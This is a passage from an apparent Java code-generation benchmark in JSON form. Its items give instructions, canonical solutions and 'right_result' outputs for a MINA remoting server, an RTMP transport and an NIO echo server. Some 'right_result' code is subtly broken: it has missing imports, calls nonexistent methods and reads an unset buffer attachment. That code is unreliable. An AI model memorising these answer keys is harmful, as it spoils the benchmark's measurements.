acceptor.unbind(bindAddress);\n            acceptor.dispose();\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 11,
    "right_result": "```java\nimport org.apache.mina.core.service.IoAcceptor;\nimport org.apache.mina.filter.codec.ProtocolCodecFilter;\nimport org.apache.mina.filter.codec.textline.TextLineCodecFactory;\nimport org.apache.mina.transport.socket.nio.NioSocketAcceptor;\nimport org.apache.mina.core.session.IdleStatus;\n\nimport java.net.InetSocketAddress;\nimport java.nio.charset.StandardCharsets;\n\npublic class MinaRemotingServer extends AbstractRemotingServer {\n\n    private IoAcceptor acceptor;\n    private InetSocketAddress bindAddress;\n\n    public MinaRemotingServer(RemotingServerConfig config) {\n        this(config, null);\n    }\n\n    public MinaRemotingServer(RemotingServerConfig config, ChannelEventListener channelEventListener) {\n        super(config, channelEventListener);\n        this.bindAddress = new InetSocketAddress(config.getPort());\n    }\n\n    public void serverStart() throws RemotingException {\n        try {\n            acceptor = new NioSocketAcceptor();\n            acceptor.getFilterChain().addLast(\"codec\", new ProtocolCodecFilter(new TextLineCodecFactory(StandardCharsets.UTF_8)));\n            if (channelEventListener != null) {\n                acceptor.setHandler(new MinaIoHandler(channelEventListener));\n            } else {\n                acceptor.setHandler(new DefaultMinaIoHandler());\n            }\n            acceptor.getSessionConfig().setReadBufferSize(2048);\n            acceptor.getSessionConfig().setIdleTime(IdleStatus.BOTH_IDLE, 10);\n            acceptor.bind(bindAddress);\n        } catch (Exception e) {\n            throw new RemotingException(\"Failed to start MINA remoting server: \" + e.getMessage(), e);\n        }\n    }\n\n    public void serverShutdown() throws RemotingException {\n        try {\n            if (acceptor != null) {\n                acceptor.unbind();\n                acceptor.dispose();\n            }\n        } catch (Exception e) {\n            throw new RemotingException(\"Failed to shutdown MINA remoting server: \" + e.getMessage(), e);\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 437,
    "Instruction": "Task Description: Create a Java class that implements a TCP server using Apache MINA framework for RTMP (Real-Time Messaging Protocol) transport, with configurable network settings and JMX monitoring capabilities.\n\nClass Description: RTMPMinaTransport is a TCP server implementation using Apache MINA that handles RTMP connections. It provides configurable network parameters, thread pooling options, and JMX monitoring capabilities. The class manages server lifecycle (start/stop), connection handling, and performance statistics.\n\nAttributes:\n\n- log: Logger - Logger instance for the class\n- executor: ThreadPoolExecutor - Thread pool executor for custom acceptor mode\n- acceptor: SocketAcceptor - MINA socket acceptor instance\n- addresses: Set<String> - Set of IP addresses and ports to bind to\n- ioHandler: IoHandlerAdapter - Handler for IO events\n- ioThreads: int - Number of IO threads (default: 2 * available processors)\n- serviceManagerObjectName: ObjectName - JMX MBean object name\n- stats: IoServiceStatistics - MINA service statistics\n- enableMinaLogFilter: boolean - Flag to enable MINA logging filter\n- enableMinaMonitor: boolean - Flag to enable JMX monitoring\n- minaPollInterval: int - JMX poll interval in ms (default: 1000)\n- tcpNoDelay: boolean - TCP_NODELAY flag (default: true)\n- useHeapBuffers: boolean - Use heap buffers flag (default: true)\n- sendBufferSize: int - Socket send buffer size (default: 65536)\n- receiveBufferSize: int - Socket receive buffer size (default: 65536)\n- readerIdleTime: int - Reader idle time in seconds (default: 2)\n- trafficClass: int - IP traffic class (default: 0x08 | 0x10)\n- backlog: int - Connection backlog (default: 32)\n- thoughputCalcInterval: int - Throughput calculation interval (default: 1)\n- executorKeepAliveTime: long - Thread keep-alive time in ms (default: 60000)\n- enableDefaultAcceptor: boolean - Use default acceptor flag (default: true)\n- initialPoolSize: int - Initial thread pool size (default: 0)\n- maxPoolSize: int - Maximum thread pool size (default: processors + 1)\n- maxProcessorPoolSize: int - Maximum processor pool size (default: 16)\n- keepAlive: boolean - Socket keep-alive flag\n\nMethods:\n\n- start() throws Exception -> void - Starts the TCP server with configured settings\n- stop() -> void - Stops the TCP server and cleans up resources\n- setAddress(String address) -> void - Adds a single address to bind to\n- setAddresses(List<String> addrs) -> void - Adds multiple addresses to bind to\n- setIoHandler(IoHandlerAdapter rtmpIOHandler) -> void - Sets the IO handler\n- setIoThreads(int ioThreads) -> void - Sets number of IO threads\n- setSendBufferSize(int sendBufferSize) -> void - Sets send buffer size\n- setReceiveBufferSize(int receiveBufferSize) -> void - Sets receive buffer size\n- setTrafficClass(int trafficClass) -> void - Sets IP traffic class\n- setBacklog(int backlog) -> void - Sets connection backlog\n- setThoughputCalcInterval(int thoughputCalcInterval) -> void - Sets throughput calculation interval\n- setExecutorKeepAliveTime(long executorKeepAliveTime) -> void - Sets thread keep-alive time\n- setEnableDefaultAcceptor(boolean enableDefaultAcceptor) -> void - Sets default acceptor flag\n- setInitialPoolSize(int initialPoolSize) -> void - Sets initial thread pool size\n- setMaxPoolSize(int maxPoolSize) -> void - Sets maximum thread pool size\n- setMaxProcessorPoolSize(int maxProcessorPoolSize) -> void - Sets maximum processor pool size\n- setTcpNoDelay(boolean tcpNoDelay) -> void - Sets TCP_NODELAY flag\n- setKeepAlive(boolean keepAlive) -> void - Sets socket keep-alive flag\n- setUseHeapBuffers(boolean useHeapBuffers) -> void - Sets heap buffers flag\n- setEnableMinaLogFilter(boolean enableMinaLogFilter) -> void - Enables/disables MINA logging filter\n- setEnableMinaMonitor(boolean enableMinaMonitor) -> void - Enables/disables JMX monitoring\n- setMinaPollInterval(int minaPollInterval) -> void - Sets JMX poll interval\n- setReaderIdleTime(int readerIdleTime) -> void - Sets reader idle time\n- isEnableMinaLogFilter() -> boolean - Returns MINA logging filter status\n- getAddress() -> String - Returns bound addresses as string",
    "Canonical_solution": "import java.lang.management.ManagementFactory;\nimport java.net.InetSocketAddress;\nimport java.util.HashSet;\nimport java.util.List;\nimport java.util.Set;\nimport java.util.concurrent.LinkedBlockingQueue;\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.TimeUnit;\n\nimport javax.management.MBeanServer;\nimport javax.management.ObjectName;\nimport javax.management.StandardMBean;\n\nimport org.apache.mina.core.buffer.IoBuffer;\nimport org.apache.mina.core.buffer.SimpleBufferAllocator;\nimport org.apache.mina.core.filterchain.DefaultIoFilterChainBuilder;\nimport org.apache.mina.core.service.AbstractIoService;\nimport org.apache.mina.core.service.IoHandlerAdapter;\nimport org.apache.mina.core.service.IoServiceStatistics;\nimport org.apache.mina.core.service.SimpleIoProcessorPool;\nimport org.apache.mina.filter.logging.LoggingFilter;\nimport org.apache.mina.transport.socket.SocketAcceptor;\nimport org.apache.mina.transport.socket.SocketSessionConfig;\nimport org.apache.mina.transport.socket.nio.NioProcessor;\nimport org.apache.mina.transport.socket.nio.NioSession;\nimport org.apache.mina.transport.socket.nio.NioSocketAcceptor;\nimport org.red5.server.jmx.mxbeans.RTMPMinaTransportMXBean;\nimport org.slf4j.Logger;\nimport org.slf4j.LoggerFactory;\n\npublic class RTMPMinaTransport implements RTMPMinaTransportMXBean {\n\n    private static final Logger log = LoggerFactory.getLogger(RTMPMinaTransport.class);\n\n    private ThreadPoolExecutor executor;\n\n    protected SocketAcceptor acceptor;\n\n    protected Set<String> addresses = new HashSet<String>();\n\n    protected IoHandlerAdapter ioHandler;\n\n    protected int ioThreads = Runtime.getRuntime().availableProcessors() * 2;\n\n    protected ObjectName serviceManagerObjectName;\n\n    protected IoServiceStatistics stats;\n\n    public void start() throws Exception {\n        IoBuffer.setUseDirectBuffer(!useHeapBuffers);\n        if (useHeapBuffers) {\n            IoBuffer.setAllocator(new SimpleBufferAllocator());\n        }\n        if (enableDefaultAcceptor) {\n            acceptor = new NioSocketAcceptor(ioThreads);\n        } else {\n            SimpleIoProcessorPool<NioSession> pool = new SimpleIoProcessorPool<NioSession>(NioProcessor.class, maxProcessorPoolSize);\n            executor = new ThreadPoolExecutor(initialPoolSize, maxPoolSize, executorKeepAliveTime, TimeUnit.MILLISECONDS, new LinkedBlockingQueue<Runnable>(Short.MAX_VALUE));\n            acceptor = new NioSocketAcceptor(executor, pool);\n        }\n        if (enableMinaLogFilter) {\n            DefaultIoFilterChainBuilder chain = acceptor.getFilterChain();\n            LoggingFilter logFilter = new LoggingFilter(RTMPMinaTransport.class);\n            chain.addLast(\"logger\", logFilter);\n        }\n        acceptor.setCloseOnDeactivation(true);\n        acceptor.setHandler(ioHandler);\n        acceptor.setBacklog(backlog);\n        SocketSessionConfig sessionConf = acceptor.getSessionConfig();\n        sessionConf.setReuseAddress(true);\n        sessionConf.setTcpNoDelay(tcpNoDelay);\n        sessionConf.setSendBufferSize(sendBufferSize);\n        sessionConf.setReceiveBufferSize(receiveBufferSize);\n        sessionConf.setMaxReadBufferSize(receiveBufferSize);\n        sessionConf.setThroughputCalculationInterval(thoughputCalcInterval);\n        sessionConf.setReaderIdleTime(readerIdleTime);\n        sessionConf.setKeepAlive(keepAlive);\n        if (trafficClass != -1) {\n            sessionConf.setTrafficClass(trafficClass);\n        }\n        acceptor.setReuseAddress(true);\n        Set<InetSocketAddress> socketAddresses = new HashSet<InetSocketAddress>();\n        for (String addr : addresses) {\n            if (addr.indexOf(':') != -1) {\n                String[] parts = addr.split(\":\");\n                socketAddresses.add(new InetSocketAddress(parts[0], Integer.valueOf(parts[1])));\n            } else {\n                socketAddresses.add(new InetSocketAddress(addr, 1935));\n            }\n        }\n        acceptor.bind(socketAddresses);\n        if (enableMinaMonitor) {\n            stats = new IoServiceStatistics((AbstractIoService) acceptor);\n            stats.setThroughputCalculationInterval(minaPollInterval);\n            MBeanServer mbs = ManagementFactory.getPlatformMBeanServer();\n            try {\n                serviceManagerObjectName = new ObjectName(\"org.red5.server:type=RTMPMinaTransport\");\n                mbs.registerMBean(new StandardMBean(this, RTMPMinaTransportMXBean.class, true), serviceManagerObjectName);\n            } catch (Exception e) {\n                log.warn(\"Error on jmx registration\", e);\n            }\n        }\n    }\n\n    public void stop() {\n        acceptor.unbind();\n        if (!enableDefaultAcceptor) {\n            executor.shutdownNow();\n        }\n        acceptor.dispose(false);\n        if (serviceManagerObjectName != null) {\n            MBeanServer mbs = ManagementFactory.getPlatformMBeanServer();\n            try {\n                mbs.unregisterMBean(serviceManagerObjectName);\n            } catch (Exception e) {\n                log.warn(\"Error on jmx unregistration\", e);\n            }\n        }\n    }\n\n    public void setAddress(String address) {\n        addresses.add(address);\n    }\n\n    public void setAddresses(List<String> addrs) {\n        for (String addr : addrs) {\n            addresses.add(addr);\n        }\n    }\n\n    public void setIoHandler(IoHandlerAdapter rtmpIOHandler) {\n        this.ioHandler = rtmpIOHandler;\n    }\n\n    public void setIoThreads(int ioThreads) {\n        this.ioThreads = ioThreads;\n    }\n\n    protected boolean enableMinaLogFilter;\n\n    protected boolean enableMinaMonitor;\n\n    protected int minaPollInterval = 1000;\n\n    protected boolean tcpNoDelay = true;\n\n    protected boolean useHeapBuffers = true;\n\n    protected int sendBufferSize = 65536;\n\n    protected int receiveBufferSize = 65536;\n\n    private int readerIdleTime = 2;\n\n    private int trafficClass = 0x08 | 0x10;\n\n    private int backlog = 32;\n\n    private int thoughputCalcInterval = 1;\n\n    private long executorKeepAliveTime = 60000;\n\n    private boolean enableDefaultAcceptor = true;\n\n    private int initialPoolSize = 0;\n\n    private int maxPoolSize = Runtime.getRuntime().availableProcessors() + 1;\n\n    private int maxProcessorPoolSize = 16;\n\n    private boolean keepAlive;\n\n    public void setSendBufferSize(int sendBufferSize) {\n        this.sendBufferSize = sendBufferSize;\n    }\n\n    public void setReceiveBufferSize(int receiveBufferSize) {\n        this.receiveBufferSize = receiveBufferSize;\n    }\n\n    public void setTrafficClass(int trafficClass) {\n        this.trafficClass = trafficClass;\n    }\n\n    public void setBacklog(int backlog) {\n        this.backlog = backlog;\n    }\n\n    public void setThoughputCalcInterval(int thoughputCalcInterval) {\n        this.thoughputCalcInterval = thoughputCalcInterval;\n    }\n\n    public void setExecutorKeepAliveTime(long executorKeepAliveTime) {\n        this.executorKeepAliveTime = executorKeepAliveTime;\n    }\n\n    public void setEnableDefaultAcceptor(boolean enableDefaultAcceptor) {\n        this.enableDefaultAcceptor = enableDefaultAcceptor;\n    }\n\n    public void setInitialPoolSize(int initialPoolSize) {\n        this.initialPoolSize = initialPoolSize;\n    }\n\n    public void setMaxPoolSize(int maxPoolSize) {\n        this.maxPoolSize = maxPoolSize;\n    }\n\n    public void setMaxProcessorPoolSize(int maxProcessorPoolSize) {\n        this.maxProcessorPoolSize = maxProcessorPoolSize;\n    }\n\n    public void setTcpNoDelay(boolean tcpNoDelay) {\n        this.tcpNoDelay = tcpNoDelay;\n    }\n\n    public void setKeepAlive(boolean keepAlive) {\n        this.keepAlive = keepAlive;\n    }\n\n    public void setUseHeapBuffers(boolean useHeapBuffers) {\n        this.useHeapBuffers = useHeapBuffers;\n    }\n\n    public boolean isEnableMinaLogFilter() {\n        return enableMinaLogFilter;\n    }\n\n    public void setEnableMinaLogFilter(boolean enableMinaLogFilter) {\n        this.enableMinaLogFilter = enableMinaLogFilter;\n    }\n\n    public void setEnableMinaMonitor(boolean enableMinaMonitor) {\n        this.enableMinaMonitor = enableMinaMonitor;\n    }\n\n    public void setMinaPollInterval(int minaPollInterval) {\n        this.minaPollInterval = minaPollInterval;\n    }\n\n    public void setReaderIdleTime(int readerIdleTime) {\n        this.readerIdleTime = readerIdleTime;\n    }\n\n    public String getAddress() {\n        return addresses.toString();\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 11,
    "right_result": "```java\nimport org.apache.mina.core.service.IoHandlerAdapter;\nimport org.apache.mina.core.session.IdleStatus;\nimport org.apache.mina.filter.logging.LoggingFilter;\nimport org.apache.mina.transport.socket.nio.NioSocketAcceptor;\nimport org.apache.mina.core.RuntimeIoException;\n\nimport javax.management.*;\nimport java.io.IOException;\nimport java.net.InetSocketAddress;\nimport java.util.ArrayList;\nimport java.util.List;\nimport java.util.Set;\nimport java.util.concurrent.*;\n\nimport org.slf4j.Logger;\nimport org.slf4j.LoggerFactory;\n\npublic class RTMPMinaTransport {\n\n    private final Logger log = LoggerFactory.getLogger(RTMPMinaTransport.class);\n    private ThreadPoolExecutor executor;\n    private SocketAcceptor acceptor;\n    private Set<String> addresses;\n    private IoHandlerAdapter ioHandler;\n    private int ioThreads = 2 * Runtime.getRuntime().availableProcessors();\n    private ObjectName serviceManagerObjectName;\n    private IoServiceStatistics stats;\n    private boolean enableMinaLogFilter = true;\n    private boolean enableMinaMonitor = true;\n    private int minaPollInterval = 1000;\n    private boolean tcpNoDelay = true;\n    private boolean useHeapBuffers = true;\n    private int sendBufferSize = 65536;\n    private int receiveBufferSize = 65536;\n    private int readerIdleTime = 2;\n    private int trafficClass = 0x08 | 0x10;\n    private int backlog = 32;\n    private int thoughputCalcInterval = 1;\n    private long executorKeepAliveTime = 60000;\n    private boolean enableDefaultAcceptor = true;\n    private int initialPoolSize = 0;\n    private int maxPoolSize = Runtime.getRuntime().availableProcessors() + 1;\n    private int maxProcessorPoolSize = 16;\n    private boolean keepAlive = false;\n\n    public void start() throws Exception {\n        if (addresses == null || addresses.isEmpty()) {\n            throw new IllegalArgumentException(\"No addresses provided to bind\");\n        }\n\n        if (enableDefaultAcceptor) {\n            acceptor = new NioSocketAcceptor(ioThreads);\n        } else {\n            executor = new ThreadPoolExecutor(\n                    initialPoolSize,\n                    maxPoolSize,\n                    executorKeepAliveTime,\n                    TimeUnit.MILLISECONDS,\n                    new LinkedBlockingQueue<>(),\n                    new ThreadPoolExecutor.CallerRunsPolicy()\n            );\n            acceptor = new NioSocketAcceptor(executor, ioThreads);\n        }\n\n        acceptor.getFilterChain().addLast(\"logger\", new LoggingFilter());\n\n        if (enableMinaLogFilter) {\n            acceptor.getFilterChain().addLast(\"minaLogFilter\", new LoggingFilter());\n        }\n\n        acceptor.getSessionConfig().setTcpNoDelay(tcpNoDelay);\n        acceptor.getSessionConfig().setUseReadOperation(false);\n        acceptor.getSessionConfig().setUseWriteOperation(false);\n        acceptor.getSessionConfig().setSendBufferSize(sendBufferSize);\n        acceptor.getSessionConfig().setReceiveBufferSize(receiveBufferSize);\n        acceptor.getSessionConfig().setSoLinger(0);\n        acceptor.getSessionConfig().setTrafficClass(trafficClass);\n        acceptor.getSessionConfig().setBacklog(backlog);\n        acceptor.getSessionConfig().setKeepAlive(keepAlive);\n        acceptor.getSessionConfig().setUseHeapBuffers(useHeapBuffers);\n        acceptor.getSessionConfig().setReaderIdleTime(readerIdleTime);\n\n        if (ioHandler != null) {\n            acceptor.setHandler(ioHandler);\n        } else {\n            acceptor.setHandler(new IoHandlerAdapter());\n        }\n\n        List<InetSocketAddress> addressList = new ArrayList<>();\n        for (String addr : addresses) {\n            String[] parts = addr.split(\":\");\n            if (parts.length < 2) {\n                throw new IllegalArgumentException(\"Invalid address format: \" + addr);\n            }\n            try {\n                int port = Integer.parseInt(parts[1]);\n                InetSocketAddress socketAddress = new InetSocketAddress(parts[0], port);\n                addressList.add(socketAddress);\n            } catch (NumberFormatException e) {\n                log.error(\"Invalid port number in address: {}\", addr, e);\n            }\n        }\n\n        for (InetSocketAddress sa : addressList) {\n            try {\n                acceptor.bind(sa);\n            } catch (RuntimeIoException e) {\n                log.error(\"Failed to bind to address: {}\", sa, e);\n            }\n        }\n\n        stats = acceptor.getServiceStatistics();\n\n        if (enableMinaMonitor) {\n            MBeanServer mBeanServer = ManagementFactory.getPlatformMBeanServer();\n            serviceManagerObjectName = new ObjectName(\"RTMP:type=RTMPMinaTransport\");\n            mBeanServer.registerMBean(this, serviceManagerObjectName);\n            ScheduledExecutorService scheduler = Executors.newSingleThreadScheduledExecutor();\n            scheduler.scheduleAtFixedRate(() -> {\n                try {\n                    log.info(\"Current connection count: {}\", stats.getActiveSessionsCount());\n                } catch (Exception ex) {\n                    log.error(\"Error while logging statistics\", ex);\n                }\n            }, minaPollInterval, minaPollInterval, TimeUnit.MILLISECONDS);\n        }\n    }\n\n    public void stop() {\n        if (acceptor != null && acceptor.isActive()) {\n            acceptor.dispose();\n        }\n\n        if (executor != null) {\n            executor.shutdownNow();\n        }\n\n        if (enableMinaMonitor && serviceManagerObjectName != null) {\n            try {\n                MBeanServer mBeanServer = ManagementFactory.getPlatformMBeanServer();\n                mBeanServer.unregisterMBean(serviceManagerObjectName);\n            } catch (Exception e) {\n                log.warn(\"Failed to unregister MBean\", e);\n            }\n        }\n    }\n\n    public void setAddress(String address) {\n        if (addresses == null) {\n            addresses = new java.util.HashSet<>();\n        }\n        addresses.add(address);\n    }\n\n    public void setAddresses(List<String> addrs) {\n        if (addresses == null) {\n            addresses = new java.util.HashSet<>();\n        }\n        addresses.addAll(addrs);\n    }\n\n    public void setIoHandler(IoHandlerAdapter rtmpIOHandler) {\n        this.ioHandler = rtmpIOHandler;\n    }\n\n    public void setIoThreads(int ioThreads) {\n        this.ioThreads = ioThreads;\n    }\n\n    public void setSendBufferSize(int sendBufferSize) {\n        this.sendBufferSize = sendBufferSize;\n    }\n\n    public void setReceiveBufferSize(int receiveBufferSize) {\n        this.receiveBufferSize = receiveBufferSize;\n    }\n\n    public void setTrafficClass(int trafficClass) {\n        this.trafficClass = trafficClass;\n    }\n\n    public void setBacklog(int backlog) {\n        this.backlog = backlog;\n    }\n\n    public void setThoughputCalcInterval(int thoughputCalcInterval) {\n        this.thoughputCalcInterval = thoughputCalcInterval;\n    }\n\n    public void setExecutorKeepAliveTime(long executorKeepAliveTime) {\n        this.executorKeepAliveTime = executorKeepAliveTime;\n    }\n\n    public void setEnableDefaultAcceptor(boolean enableDefaultAcceptor) {\n        this.enableDefaultAcceptor = enableDefaultAcceptor;\n    }\n\n    public void setInitialPoolSize(int initialPoolSize) {\n        this.initialPoolSize = initialPoolSize;\n    }\n\n    public void setMaxPoolSize(int maxPoolSize) {\n        this.maxPoolSize = maxPoolSize;\n    }\n\n    public void setMaxProcessorPoolSize(int maxProcessorPoolSize) {\n        this.maxProcessorPoolSize = maxProcessorPoolSize;\n    }\n\n    public void setTcpNoDelay(boolean tcpNoDelay) {\n        this.tcpNoDelay = tcpNoDelay;\n    }\n\n    public void setKeepAlive(boolean keepAlive) {\n        this.keepAlive = keepAlive;\n    }\n\n    public void setUseHeapBuffers(boolean useHeapBuffers) {\n        this.useHeapBuffers = useHeapBuffers;\n    }\n\n    public void setEnableMinaLogFilter(boolean enableMinaLogFilter) {\n        this.enableMinaLogFilter = enableMinaLogFilter;\n    }\n\n    public void setEnableMinaMonitor(boolean enableMinaMonitor) {\n        this.enableMinaMonitor = enableMinaMonitor;\n    }\n\n    public void setMinaPollInterval(int minaPollInterval) {\n        this.minaPollInterval = minaPollInterval;\n    }\n\n    public void setReaderIdleTime(int readerIdleTime) {\n        this.readerIdleTime = readerIdleTime;\n    }\n\n    public boolean isEnableMinaLogFilter() {\n        return enableMinaLogFilter;\n    }\n\n    public String getAddress() {\n        StringBuilder sb = new StringBuilder();\n        for (String addr : addresses) {\n            sb.append(addr).append(\",\");\n        }\n        if (sb.length() > 0) {\n            sb.deleteCharAt(sb.length() - 1);\n        }\n        return sb.toString();\n    }\n}\n```"
  },
  {
    "Task_id": 439,
    "Instruction": "Task Description: Implement a non-blocking TCP echo server using Java NIO (New I/O) that can handle multiple client connections simultaneously. The server should echo back any data received from clients.\n\nClass Description: NonBlokingEchoServer is a Java NIO-based server implementation that uses non-blocking I/O operations to handle multiple client connections efficiently through a single thread. It utilizes Selector, ServerSocketChannel, and SocketChannel for managing connections and ByteBuffer for data operations.\n\nAttributes:\n- serverChannel: [ServerSocketChannel] - The main server channel that listens for incoming connections\n- selector: [Selector] - The multiplexor that monitors registered channels for I/O events\n- port: [int] - The port number on which the server listens for connections\n\nMethods:\n- NonBlokingEchoServer(int port) -> [void] - Constructor that initializes the server with the specified port\n- start() -> [void] - Starts the server, binds to the port, and begins accepting client connections\n- handleKey(SelectionKey key) -> [void] - Handles different types of I/O events (accept, read, write)\n- handleAccept(SelectionKey key) -> [void] - Processes new client connection requests\n- handleRead(SelectionKey key) -> [void] - Reads data from connected clients\n- handleWrite(SelectionKey key) -> [void] - Writes data back to connected clients\n- close() -> [void] - Closes the server channel and selector, releasing all resources",
    "Canonical_solution": "import java.io.IOException;\nimport java.net.InetSocketAddress;\nimport java.nio.ByteBuffer;\nimport java.nio.channels.SelectionKey;\nimport java.nio.channels.Selector;\nimport java.nio.channels.ServerSocketChannel;\nimport java.nio.channels.SocketChannel;\nimport java.util.Iterator;\nimport java.util.Set;\n\npublic class NonBlokingEchoServer {\n    private ServerSocketChannel serverChannel;\n    private Selector selector;\n    private int port;\n\n    public NonBlokingEchoServer(int port) {\n        this.port = port;\n    }\n\n    public void start() throws IOException {\n        serverChannel = ServerSocketChannel.open();\n        InetSocketAddress address = new InetSocketAddress(port);\n        serverChannel.bind(address);\n        serverChannel.configureBlocking(false);\n        selector = Selector.open();\n        serverChannel.register(selector, SelectionKey.OP_ACCEPT);\n\n        System.out.println(\"NonBlokingEchoServer\u5df2\u542f\u52a8\uff0c\u7aef\u53e3\uff1a\" + port);\n\n        while (true) {\n            try {\n                selector.select();\n            } catch (IOException e) {\n                System.out.println(\"NonBlockingEchoServer\u5f02\u5e38!\" + e.getMessage());\n            }\n            Set<SelectionKey> readyKeys = selector.selectedKeys();\n            Iterator<SelectionKey> iterator = readyKeys.iterator();\n            while (iterator.hasNext()) {\n                SelectionKey key = iterator.next();\n                iterator.remove();\n                try {\n                    handleKey(key);\n                } catch (IOException ex) {\n                    key.cancel();\n                    try {\n                        key.channel().close();\n                    } catch (IOException cex) {\n                        System.out.println(\"NonBlockingEchoServer\u5f02\u5e38!\" + cex.getMessage());\n                    }\n                }\n            }\n        }\n    }\n\n    private void handleKey(SelectionKey key) throws IOException {\n        if (key.isAcceptable()) {\n            handleAccept(key);\n        } else if (key.isReadable()) {\n            handleRead(key);\n        } else if (key.isWritable()) {\n            handleWrite(key);\n        }\n    }\n\n    private void handleAccept(SelectionKey key) throws IOException {\n        ServerSocketChannel server = (ServerSocketChannel) key.channel();\n        SocketChannel socketChannel = server.accept();\n        System.out.println(\"NonBlokingEchoServer\u63a5\u53d7\u5ba2\u6237\u7aef\u7684\u8fde\u63a5\uff1a\" + socketChannel);\n        socketChannel.configureBlocking(false);\n        SelectionKey clientKey = socketChannel.register(selector,\n                SelectionKey.OP_WRITE | SelectionKey.OP_READ);\n        ByteBuffer buffer = ByteBuffer.allocate(100);\n        clientKey.attach(buffer);\n    }\n\n    private void handleRead(SelectionKey key) throws IOException {\n        SocketChannel client = (SocketChannel) key.channel();\n        ByteBuffer output = (ByteBuffer) key.attachment();\n        client.read(output);\n        System.out.println(client.getRemoteAddress() \n                + \" -> NonBlokingEchoServer\uff1a\" + output.toString());\n        key.interestOps(SelectionKey.OP_WRITE);\n    }\n\n    private void handleWrite(SelectionKey key) throws IOException {\n        SocketChannel client = (SocketChannel) key.channel();\n        ByteBuffer output = (ByteBuffer) key.attachment();\n        output.flip();\n        client.write(output);\n        System.out.println(\"NonBlokingEchoServer  -> \" \n                + client.getRemoteAddress() + \"\uff1a\" + output.toString());\n        output.compact();\n        key.interestOps(SelectionKey.OP_READ);\n    }\n\n    public void close() throws IOException {\n        if (serverChannel != null) {\n            serverChannel.close();\n        }\n        if (selector != null) {\n            selector.close();\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 7,
    "right_result": "```java\nimport java.io.IOException;\nimport java.net.InetSocketAddress;\nimport java.nio.ByteBuffer;\nimport java.nio.channels.SelectionKey;\nimport java.nio.channels.Selector;\nimport java.nio.channels.ServerSocketChannel;\nimport java.nio.channels.SocketChannel;\nimport java.util.Iterator;\nimport java.util.Set;\n\npublic class NonBlokingEchoServer {\n    private ServerSocketChannel serverChannel;\n    private Selector selector;\n    private int port;\n\n    public NonBlokingEchoServer(int port) {\n        this.port = port;\n    }\n\n    public void start() throws IOException {\n        selector = Selector.open();\n        serverChannel = ServerSocketChannel.open();\n        serverChannel.configureBlocking(false);\n        serverChannel.bind(new InetSocketAddress(port));\n        serverChannel.register(selector, SelectionKey.OP_ACCEPT);\n\n        System.out.println(\"Non-blocking echo server started on port \" + port);\n\n        while (true) {\n            if (selector.select() == 0) {\n                continue;\n            }\n\n            Set<SelectionKey> selectedKeys = selector.selectedKeys();\n            Iterator<SelectionKey> iter = selectedKeys.iterator();\n\n            while (iter.hasNext()) {\n                SelectionKey key = iter.next();\n                iter.remove();\n                handleKey(key);\n            }\n        }\n    }\n\n    private void handleKey(SelectionKey key) {\n        if (!key.isValid()) {\n            return;\n        }\n\n        if (key.isAcceptable()) {\n            handleAccept(key);\n        } else if (key.isReadable()) {\n            handleRead(key);\n        } else if (key.isWritable()) {\n            handleWrite(key);\n        }\n    }\n\n    private void handleAccept(SelectionKey key) {\n        try {\n            ServerSocketChannel serverChannel = (ServerSocketChannel) key.channel();\n            SocketChannel clientChannel = serverChannel.accept();\n            if (clientChannel != null) {\n                clientChannel.configureBlocking(false);\n                clientChannel.register(selector, SelectionKey.OP_READ);\n                System.out.println(\"New client connected: \" + clientChannel.getRemoteAddress());\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    private void handleRead(SelectionKey key) {\n        SocketChannel clientChannel = (SocketChannel) key.channel();\n        ByteBuffer buffer = ByteBuffer.allocate(1024);\n        int bytesRead;\n\n        try {\n            bytesRead = clientChannel.read(buffer);\n            if (bytesRead == -1) {\n                clientChannel.close();\n                System.out.println(\"Client disconnected: \" + clientChannel.getRemoteAddress());\n                return;\n            }\n\n            buffer.flip();\n            byte[] data = new byte[buffer.limit()];\n            buffer.get(data);\n            String receivedMessage = new String(data).trim();\n            System.out.println(\"Received from client: \" + receivedMessage);\n\n            ByteBuffer writeBuffer = ByteBuffer.wrap(receivedMessage.getBytes());\n            clientChannel.write(writeBuffer);\n            if (writeBuffer.hasRemaining()) {\n                clientChannel.register(selector, SelectionKey.OP_WRITE);\n            }\n\n        } catch (IOException e) {\n            try {\n                clientChannel.close();\n            } catch (IOException ex) {\n                ex.printStackTrace();\n            }\n            e.printStackTrace();\n        }\n    }\n\n    private void handleWrite(SelectionKey key) {\n        SocketChannel clientChannel = (SocketChannel) key.channel();\n        ByteBuffer buffer = (ByteBuffer) key.attachment();\n\n        try {\n            clientChannel.write(buffer);\n            if (buffer.hasRemaining()) {\n                clientChannel.register(selector, SelectionKey.OP_WRITE);\n            } else {\n                clientChannel.register(selector, SelectionKey.OP_READ);\n            }\n        } catch (IOException e) {\n            try {\n                clientChannel.close();\n            } catch (IOException ex) {\n                ex.printStackTrace();\n            }\n            e.printStackTrace();\n        }\n    }\n\n    public void close() {\n        try {\n            if (serverChannel != null && serverChannel.isOpen()) {\n                serverChannel.close();\n            }\n            if (selector != null && selector.isOpen()) {\n                selector.close();\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 44,
    "Instruction": "Task Description: Create a Java class that handles HTTP communication with a hub service, specifically for device registration and key management.\n\nClass Description: The HubHttpClient class provides functionality to register a device with a remote hub service using HTTP requests. It handles JSON serialization, authentication, and response processing, while supporting asynchronous operations.\n\nAttributes:\n- JSON: ObjectMapper - A static instance for JSON serialization/deserialization\n- EXPECTED_RESPONSE_CODES: List<Integer> - List of acceptable HTTP response codes\n- hubConfig: HubConfig - Configuration for the hub service\n- bearerToken: String - Authentication token for API requests\n- deviceId: String - Unique identifier for the device\n- keyPair: P384KeyPair - Cryptographic key pair for the device\n- result: CompletableFuture<ReceivedKey> - Future for asynchronous result handling\n- httpClient: HttpClient - HTTP client for making requests\n\nMethods:\n- HubHttpClient(ExecutorService, HubConfig, String, DeviceKey, CompletableFuture<ReceivedKey>, AtomicReference<String>) -> None - Constructor that initializes the HTTP client with configuration and credentials\n- registerDevice(String) -> None - Registers a device with the hub service using the provided device name\n- toJson(CreateDeviceDto) -> String - Serializes a DTO to JSON string\n- 